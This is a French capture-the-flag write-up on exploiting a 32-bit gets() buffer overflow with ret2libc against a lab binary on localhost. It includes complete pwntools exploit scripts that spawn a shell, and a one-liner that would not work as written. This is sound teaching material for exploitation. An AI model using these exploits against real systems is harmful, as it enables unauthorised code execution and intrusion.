# Challenge 4: ret2libc 32-bit - Writeup

## Analyse du challenge

Ce challenge présente une vulnérabilité de buffer overflow classique exploitée via une technique ret2libc. Le binaire est compilé en 32 bits et affiche les adresses de `system` et `/bin/sh` pour faciliter l'exploitation.

## Analyse du binaire

### Compilation

Le binaire est compilé avec:
- `-m32`: architecture 32 bits
- `-fno-stack-protector`: pas de canary
- `-no-pie`: pas d'ASLR pour les adresses du code
- `-z execstack`: stack exécutable (non nécessaire pour ret2libc)

### Vulnérabilité

Dans `vuln()`:
```c
char buffer[64];
gets(buffer);
```

La fonction `gets()` ne vérifie pas la taille du buffer, permettant un buffer overflow.

### Informations affichées

Le programme affiche:
- L'adresse de la chaîne `/bin/sh` dans le binaire
- L'adresse de la fonction `system` dans la libc

## Exploitation ret2libc

### Principe

Au lieu d'exécuter du shellcode, on utilise des fonctions déjà présentes dans la libc:
1. `system()` pour exécuter une commande
2. La chaîne `/bin/sh` comme argument

### Structure de la stack en 32 bits

En 32 bits, les arguments sont passés sur la stack:
```
[padding][system_addr][fake_ret][/bin/sh_addr]
```

- `padding`: pour remplir le buffer et atteindre l'adresse de retour
- `system_addr`: adresse de la fonction `system` (écrase l'adresse de retour)
- `fake_ret`: adresse de retour après `system()` (peut être n'importe quoi, souvent 0xdeadbeef)
- `/bin/sh_addr`: argument pour `system()` (pointe vers la chaîne "/bin/sh")

### Étape 1: Déterminer l'offset

Structure de la stack:
```
[buffer 64 bytes][saved EBP 4 bytes][saved EIP 4 bytes]
```

Sur x86 (32 bits), après le buffer de 64 octets:
- 4 octets pour le saved EBP (frame pointer)
- 4 octets pour le saved EIP (return address)

Total: 64 + 4 = 68 octets avant l'EIP.

### Étape 2: Récupérer les adresses

Le programme affiche déjà les adresses:
```
/bin/sh a : 0x804a024
system a : 0xf7e4c420
```

### Étape 3: Construire le payload

Le payload doit être:
- 68 octets de padding (pour remplir buffer + EBP)
- 4 octets: adresse de `system()` en little-endian
- 4 octets: fake return address (ex: 0xdeadbeef)
- 4 octets: adresse de `/bin/sh` en little-endian

### Étape 4: Exploitation avec Python

```python
from pwn import *

# Connexion
conn = remote('localhost', 1337)

# Récupérer les adresses depuis la sortie
output = conn.recvuntil(b'Bof\n')
print(output.decode())

# Parser les adresses (exemple, à adapter selon le format)
# /bin/sh a : 0x804a024
# system a : 0xf7e4c420

# Extraire les adresses (méthode manuelle ou parsing)
sh_addr = 0x804a024  # À adapter
system_addr = 0xf7e4c420  # À adapter

# Construction du payload
payload = b'A' * 68  # Padding
payload += p32(system_addr)  # Adresse de system()
payload += p32(0xdeadbeef)  # Fake return address
payload += p32(sh_addr)  # Argument: adresse de /bin/sh

# Envoi
conn.sendline(payload)
conn.interactive()
```

### Étape 5: Exploitation automatique avec parsing

```python
#!/usr/bin/env python3
from pwn import *

context.arch = 'i386'  # 32 bits

# Connexion
io = remote('localhost', 1337)

# Recevoir et parser les adresses
output = io.recvuntil(b'Bof\n').decode()
print(output)

# Extraire les adresses
sh_line = [l for l in output.split('\n') if '/bin/sh' in l][0]
system_line = [l for l in output.split('\n') if 'system' in l][0]

sh_addr = int(sh_line.split(':')[1].strip(), 16)
system_addr = int(system_line.split(':')[1].strip(), 16)

print(f"/bin/sh @ {hex(sh_addr)}")
print(f"system @ {hex(system_addr)}")

# Construction du payload
payload = b'A' * 68  # Padding jusqu'à EIP
payload += p32(system_addr)  # Adresse de system()
payload += p32(0xdeadbeef)  # Fake return (après system)
payload += p32(sh_addr)  # Argument pour system()

# Envoi
io.sendline(payload)
io.interactive()
```

## Vérification de l'offset avec pattern

Si vous n'êtes pas sûr de l'offset:

```python
from pwn import *

io = remote('localhost', 1337)
io.recvuntil(b'Bof\n')
pattern = cyclic(100)
io.sendline(pattern)
io.wait()
```

Puis dans gdb, vérifiez la valeur de EIP et utilisez `cyclic_find()` pour trouver l'offset.

## Exploitation manuelle

Avec les adresses affichées (exemple):
```bash
python3 -c "
from pwn import *
payload = b'A'*68 + p32(0xf7e4c420) + p32(0xdeadbeef) + p32(0x804a024)
print(payload)
" | nc localhost 1337
```

## Flag

Après exploitation réussie, vous obtenez un shell:
```bash
cat flag.txt
FLAG{Ret2Libc_32bit_2024}
```

## Résumé

1. Buffer overflow: 64 bytes buffer, `gets()` sans limite
2. Offset EIP: 68 bytes (64 buffer + 4 EBP) en 32 bits
3. Adresses fournies: `/bin/sh` et `system` affichées par le programme
4. Payload: `[68*A][system][fake_ret][/bin/sh]`
5. Résultat: shell avec les privilèges du binaire

## Notes techniques

- En 32 bits, les arguments sont passés sur la stack (appel de fonction cdecl)
- `system()` attend un pointeur vers une chaîne de caractères
- La fake return address n'est pas importante car on obtient un shell
- Cette technique fonctionne même avec NX (No Execute) activé car on n'exécute pas de shellcode

